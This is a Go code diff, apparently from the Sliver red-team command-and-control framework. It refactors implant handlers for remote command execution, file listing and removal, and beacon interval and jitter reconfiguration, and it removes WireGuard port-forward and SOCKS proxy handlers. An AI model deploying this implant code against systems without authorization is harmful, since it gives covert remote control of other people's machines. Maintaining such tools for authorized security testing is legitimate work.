@@ -20,25 +20,21 @@ package handlers
 
 import (
 	"archive/tar"
+	"bufio"
 	"bytes"
 	"compress/gzip"
 	"errors"
 	"fmt"
 	"io"
 	"io/ioutil"
+	"os"
 	"os/exec"
+	"path/filepath"
 	"strings"
 	"time"
 
 	// {{if .Config.Debug}}
 	"log"
-	// {{end}}
-
-	"os"
-	"path/filepath"
-
-	// {{if .Config.WGc2Enabled}}
-	"github.com/bishopfox/sliver/implant/sliver/forwarder"
 	// {{end}}
 
 	"github.com/bishopfox/sliver/implant/sliver/transports"
@@ -127,12 +123,18 @@ func dirListHandler(data []byte, resp RPCResponse) {
 }
 
 func getDirList(target string) (string, []os.FileInfo, error) {
-	dir, _ := filepath.Abs(target)
+	dir, err := filepath.Abs(target)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("dir list failed to construct path %s", err)
+		// {{end}}
+		return "", nil, err
+	}
 	if _, err := os.Stat(dir); !os.IsNotExist(err) {
 		files, err := ioutil.ReadDir(dir)
 		return dir, files, err
 	}
-	return dir, []os.FileInfo{}, errors.New("Directory does not exist")
+	return dir, []os.FileInfo{}, errors.New("directory does not exist")
 }
 
 func rmHandler(data []byte, resp RPCResponse) {
@@ -140,7 +142,7 @@ func rmHandler(data []byte, resp RPCResponse) {
 	err := proto.Unmarshal(data, rmReq)
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("error decoding message: %v", err)
+		log.Printf("error decoding message: %s", err)
 		// {{end}}
 		return
 	}
@@ -151,7 +153,7 @@ func rmHandler(data []byte, resp RPCResponse) {
 	_, err = os.Stat(target)
 	if err == nil {
 		if (target == "/" || target == "C:\\") && !rmReq.Force {
-			err = errors.New("Cowardly refusing to remove volume root without force")
+			err = errors.New("cowardly refusing to remove volume root without force")
 		}
 	}
 
@@ -362,7 +364,11 @@ func uploadHandler(data []byte, resp RPCResponse) {
 
 func executeHandler(data []byte, resp RPCResponse) {
 	var (
-		err error
+		err       error
+		stdErr    io.Writer
+		stdOut    io.Writer
+		errWriter *bufio.Writer
+		outWriter *bufio.Writer
 	)
 	execReq := &sliverpb.ExecuteReq{}
 	err = proto.Unmarshal(data, execReq)
@@ -377,9 +383,43 @@ func executeHandler(data []byte, resp RPCResponse) {
 	cmd := exec.Command(execReq.Path, execReq.Args...)
 
 	if execReq.Output {
-		res, err := cmd.CombinedOutput()
+		stdOutBuff := new(bytes.Buffer)
+		stdErrBuff := new(bytes.Buffer)
+		stdErr = stdErrBuff
+		stdOut = stdOutBuff
+		if execReq.Stderr != "" {
+			stdErrFile, err := os.Create(execReq.Stderr)
+			if err != nil {
+				execResp.Response = &commonpb.Response{
+					Err: fmt.Sprintf("%s", err),
+				}
+				proto.Marshal(execResp)
+				resp(data, err)
+				return
+			}
+			defer stdErrFile.Close()
+			errWriter = bufio.NewWriter(stdErrFile)
+			stdErr = io.MultiWriter(errWriter, stdErrBuff)
+		}
+		if execReq.Stdout != "" {
+			stdOutFile, err := os.Create(execReq.Stdout)
+			if err != nil {
+				execResp.Response = &commonpb.Response{
+					Err: fmt.Sprintf("%s", err),
+				}
+				proto.Marshal(execResp)
+				resp(data, err)
+				return
+			}
+			defer stdOutFile.Close()
+			outWriter = bufio.NewWriter(stdOutFile)
+			stdOut = io.MultiWriter(outWriter, stdOutBuff)
+		}
+		cmd.Stdout = stdOut
+		cmd.Stderr = stdErr
+		err := cmd.Run()
 		//{{if .Config.Debug}}
-		log.Println(string(res))
+		log.Printf("Exec (%v): %s", err, string(stdOutBuff.String()))
 		//{{end}}
 		if err != nil {
 			// Exit errors are not a failure of the RPC, but of the command.
@@ -391,7 +431,17 @@ func executeHandler(data []byte, resp RPCResponse) {
 				}
 			}
 		}
-		execResp.Result = string(res)
+		if errWriter != nil {
+			errWriter.Flush()
+		}
+		if outWriter != nil {
+			outWriter.Flush()
+		}
+		execResp.Stderr = stdErrBuff.Bytes()
+		execResp.Stdout = stdOutBuff.Bytes()
+		if cmd.Process != nil {
+			execResp.Pid = uint32(cmd.Process.Pid)
+		}
 	} else {
 		err = cmd.Start()
 		if err != nil {
@@ -479,204 +529,40 @@ func unsetEnvHandler(data []byte, resp RPCResponse) {
 	resp(data, err)
 }
 
-func reconnectIntervalHandler(data []byte, resp RPCResponse) {
-	reconnectIntervalReq := &sliverpb.ReconnectIntervalReq{}
-	err := proto.Unmarshal(data, reconnectIntervalReq)
+func reconfigureHandler(data []byte, resp RPCResponse) {
+	reconfigReq := &sliverpb.ReconfigureReq{}
+	err := proto.Unmarshal(data, reconfigReq)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("error decoding message: %v\n", err)
 		// {{end}}
 		return
 	}
+	if reconfigReq.ReconnectInterval != 0 {
+		transports.SetReconnectInterval(reconfigReq.ReconnectInterval)
+	}
 
-	reconnectInterval := reconnectIntervalReq.GetReconnectIntervalSeconds()
-	// {{if .Config.Debug}}
-	log.Printf("Update reconnect interval called: %d\n", reconnectInterval)
+	// {{if .Config.IsBeacon}}
+	if reconfigReq.BeaconInterval != 0 {
+		transports.SetInterval(reconfigReq.BeaconInterval)
+	}
+	if reconfigReq.BeaconJitter != 0 {
+		transports.SetJitter(reconfigReq.BeaconJitter)
+	}
 	// {{end}}
 
-	// Set the reconnect interval value
-	transports.SetReconnectInterval(int(reconnectInterval))
-
-	recIntervalResp := &sliverpb.ReconnectInterval{}
-	recIntervalResp.Response = &commonpb.Response{}
-	if err != nil {
-		recIntervalResp.Response.Err = err.Error()
-	}
-
-	data, err = proto.Marshal(recIntervalResp)
+	reconfigResp := &sliverpb.Reconfigure{}
+	data, err = proto.Marshal(reconfigResp)
 	resp(data, err)
 }
-
-func pollIntervalHandler(data []byte, resp RPCResponse) {
-	pollIntervalReq := &sliverpb.PollIntervalReq{}
-	err := proto.Unmarshal(data, pollIntervalReq)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("error decoding message: %v\n", err)
-		// {{end}}
-		return
-	}
-
-	pollInterval := pollIntervalReq.GetPollIntervalSeconds()
-	// {{if .Config.Debug}}
-	log.Printf("Update poll interval called: %d\n", pollInterval)
-	// {{end}}
-
-	// Set the reconnect interval value
-	transports.SetPollInterval(int(pollInterval))
-
-	pollIntervalResp := &sliverpb.PollInterval{}
-	pollIntervalResp.Response = &commonpb.Response{}
-	if err != nil {
-		pollIntervalResp.Response.Err = err.Error()
-	}
-
-	data, err = proto.Marshal(pollIntervalResp)
-	resp(data, err)
-}
-
-// {{if .Config.WGc2Enabled}}
-
-func wgListTCPForwardersHandler(_ []byte, resp RPCResponse) {
-	fwders := forwarder.GetTCPForwarders()
-	listResp := &sliverpb.WGTCPForwarders{}
-	fwdList := make([]*sliverpb.WGTCPForwarder, 0)
-	for _, f := range fwders {
-		fwdList = append(fwdList, &sliverpb.WGTCPForwarder{
-			ID:         int32(f.ID),
-			LocalAddr:  f.LocalAddr(),
-			RemoteAddr: f.RemoteAddr(),
-		})
-	}
-	listResp.Forwarders = fwdList
-	data, err := proto.Marshal(listResp)
-	resp(data, err)
-}
-
-func wgStartPortfwdHandler(data []byte, resp RPCResponse) {
-	fwdReq := &sliverpb.WGPortForwardStartReq{}
-	err := proto.Unmarshal(data, fwdReq)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("error decoding message: %v\n", err)
-		// {{end}}
-		return
-	}
-
-	fwder := forwarder.NewWGTCPForwarder(fwdReq.RemoteAddress, transports.GetTUNAddress(), int(fwdReq.LocalPort), transports.GetTNet())
-	go fwder.Start()
-	fwdResp := &sliverpb.WGPortForward{
-		Response: &commonpb.Response{},
-		Forwarder: &sliverpb.WGTCPForwarder{
-			ID:         int32(fwder.ID),
-			LocalAddr:  fwder.LocalAddr(),
-			RemoteAddr: fwder.RemoteAddr(),
-		},
-	}
-	if err != nil {
-		fwdResp.Response.Err = err.Error()
-	}
-	data, err = proto.Marshal(fwdResp)
-	resp(data, err)
-}
-
-func wgStopPortfwdHandler(data []byte, resp RPCResponse) {
-	stopReq := &sliverpb.WGPortForwardStopReq{}
-	err := proto.Unmarshal(data, stopReq)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("error decoding message: %v\n", err)
-		// {{end}}
-		return
-	}
-	stopResp := &sliverpb.WGPortForward{
-		Response: &commonpb.Response{},
-	}
-	fwd := forwarder.GetTCPForwarder(int(stopReq.ID))
-	if fwd == nil {
-		stopResp.Response.Err = fmt.Sprintf("no forwarder found for id %d", stopReq.ID)
-	} else {
-		stopResp.Forwarder = &sliverpb.WGTCPForwarder{
-			ID:         int32(fwd.ID),
-			LocalAddr:  fwd.LocalAddr(),
-			RemoteAddr: fwd.RemoteAddr(),
-		}
-		fwd.Stop()
-		forwarder.RemoveTCPForwarder(fwd.ID)
-	}
-	data, err = proto.Marshal(stopResp)
-	resp(data, err)
-}
-
-func wgListSocksServersHandler(data []byte, resp RPCResponse) {
-	socksServers := forwarder.GetSocksServers()
-	listResp := &sliverpb.WGSocksServers{}
-	serverList := make([]*sliverpb.WGSocksServer, 0)
-	for _, s := range socksServers {
-		serverList = append(serverList, &sliverpb.WGSocksServer{
-			ID:        int32(s.ID),
-			LocalAddr: s.LocalAddr(),
-		})
-	}
-	listResp.Servers = serverList
-	data, err := proto.Marshal(listResp)
-	resp(data, err)
-}
-
-func wgStartSocksHandler(data []byte, resp RPCResponse) {
-	startReq := &sliverpb.WGSocksStartReq{}
-	err := proto.Unmarshal(data, startReq)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("error decoding message: %v\n", err)
-		// {{end}}
-		return
-	}
-	server := forwarder.NewWGSocksServer(int(startReq.Port), transports.GetTUNAddress(), transports.GetTNet())
-	go server.Start()
-	startResp := &sliverpb.WGSocks{
-		Response: &commonpb.Response{},
-		Server: &sliverpb.WGSocksServer{
-			ID:        int32(server.ID),
-			LocalAddr: server.LocalAddr(),
-		},
-	}
-	data, err = proto.Marshal(startResp)
-	resp(data, err)
-}
-func wgStopSocksHandler(data []byte, resp RPCResponse) {
-	stopReq := &sliverpb.WGSocksStopReq{}
-	err := proto.Unmarshal(data, stopReq)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("error decoding message: %v\n", err)
-		// {{end}}
-		return
-	}
-	server := forwarder.GetSocksServer(int(stopReq.ID))
-	stopResp := &sliverpb.WGSocks{
-		Response: &commonpb.Response{},
-	}
-	if server == nil {
-		stopResp.Response.Err = fmt.Sprintf("no server found for id %d", stopReq.ID)
-	} else {
-		stopResp.Server = &sliverpb.WGSocksServer{
-			ID:        int32(server.ID),
-			LocalAddr: server.LocalAddr(),
-		}
-		server.Stop()
-		forwarder.RemoveSocksServer(server.ID)
-	}
-	data, err = proto.Marshal(stopResp)
-	resp(data, err)
-}
-
-// {{end}}
 
 // ---------------- Data Encoders ----------------
 
 func gzipWrite(w io.Writer, data []byte) error {
 	gw, err := gzip.NewWriterLevel(w, gzip.BestSpeed)
+	if err != nil {
+		return err
+	}
 	defer gw.Close()
 	gw.Write(data)
 	return err
